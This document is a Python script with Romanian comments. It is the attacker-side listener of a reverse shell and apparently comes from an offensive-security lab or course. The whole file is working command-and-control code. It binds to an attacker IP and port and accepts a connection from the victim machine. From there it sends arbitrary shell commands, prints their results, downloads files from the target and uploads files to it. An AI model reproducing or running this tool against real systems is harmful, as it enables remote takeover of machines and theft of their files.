import os #Utilizează funcții dependente de sistemul de operare.
import socket #Permite programului să creeze conexiuni de rețea.
import json #Transformă datele în format JSON.

SERVER_IP = '192.168.100.4'  # IP-ul de la mașina atacatoare.
SERVER_PORT = 5555


def reliable_send(data):
    json_data = json.dumps(data)
    target_sock.send(json_data.encode())

#Trimite datele la mașina atacatoare și le transformă în format JSON.

def reliable_recv():
    data = ''
    while True:
        try:
            data = data + target_sock.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

#Acumulează date și convertește JSON-ul într-un obiect Python.

def upload_file(filename):
    file = open(filename, 'rb')
    target_sock.send(file.read())
    file.close()

#De pe mașina atacatoare poți transmite file-uri pe mașina atacată.

def download_file(filename):
    file = open(filename, 'wb')
    target_sock.settimeout(1)
    chunk = target_sock.recv(1024)
    while chunk:
        file.write(chunk)
        try:
            chunk = target_sock.recv(1024)
        except socket.timeout:
            break
    target_sock.settimeout(None)
    file.close()

#Descarcă fișiere de pe mașina atacată.

def target_communication():
    while True:
        command = input(f'* Shell~{str(target_ip)}: ')
        reliable_send(command)
        if command == 'quit':
            break
        elif command[:3] == 'cd ':
            pass
        elif command == 'clear':
            os.system('clear')
        elif command[:9] == 'download ':
            download_file(command[9:])
        elif command[:7] == 'upload ':
            upload_file(command[7:])
        else:
            result = reliable_recv()
            print(result)

#Gestionează interacțiunea cu mașina atacată, executând comenzi și transferând fișiere.

server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#Creează un socket de rețea pentru IPv4 și TCP.
server_sock.bind((SERVER_IP, SERVER_PORT))
#Asociază socket-ul la adresa IP și portul specificat.

print('[+] Listening For Incoming Connections') #Afișează mesajul în terminalul mașinei atacatoare.
server_sock.listen(5) #Pune socket-ul mașinei atacatoare și e gata să accepte conexiuni.
target_sock, target_ip = server_sock.accept() #Acceptă o conexiune de la mașina atacată și returnează două valori.
print(f'[+] Target Connected From: {str(target_ip)}') #Informează atacatorul că mașina atacată s-a conectat și afișează adresa IP.

target_communication() # Începe procesul de comunicare continuă dintre mașini.
